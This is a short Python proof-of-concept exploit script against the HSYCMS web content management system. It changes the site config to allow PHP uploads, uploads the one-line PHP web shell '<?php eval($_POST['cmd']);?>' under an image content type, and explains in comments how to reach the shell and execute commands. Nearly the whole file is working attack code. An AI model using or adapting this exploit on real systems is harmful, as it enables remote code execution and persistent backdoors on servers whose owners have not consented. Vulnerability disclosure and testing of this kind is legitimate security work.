import requests


'''
open hsycms/login/index.html and login in as admin

after logged in as admin 
'''



session = requests.session()

burp0_url = "http://192.168.0.128:80/hsycms/site/updateconfig.html"
burp0_cookies = {"PHPSESSID": "8qva8t0pfm8sglakdai9ctolg1"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://192.168.0.128/hsycms/site/config.html", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}
burp0_data = {"upload_ext": "php,phtml"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


'''
upload shell <?php eval($_POST['cmd']);?>
'''

burp0_url = "http://192.168.0.128:80/index.php/hsycms/common/doupload.html"
burp0_cookies = {"PHPSESSID": "8qva8t0pfm8sglakdai9ctolg1", "XDEBUG_SESSION": "PHPSTORM"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://192.168.0.128/hsycms/site/topimg/id/1/type/0.html", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------82174579613156523632064090407", "Connection": "close"}
burp0_data = "-----------------------------82174579613156523632064090407\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\nContent-Type: image/png\r\n\r\n<?php eval($_POST['cmd']);?>\r\n-----------------------------82174579613156523632064090407--\r\n"
r=session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
print(r.text)

'''
get upload path  

for example 

{"status":"y","info":"文件上传成功",
"url":"\/upload\/20200408\/e04236222373ddc238d016c390d38cc0.php",
"ext":"php",
"name":"e04236222373ddc238d016c390d38cc0"}

then open http://192.168.0.128:80/upload/20200408/e04236222373ddc238d016c390d38cc0.php and POST cmd to execute code
'''


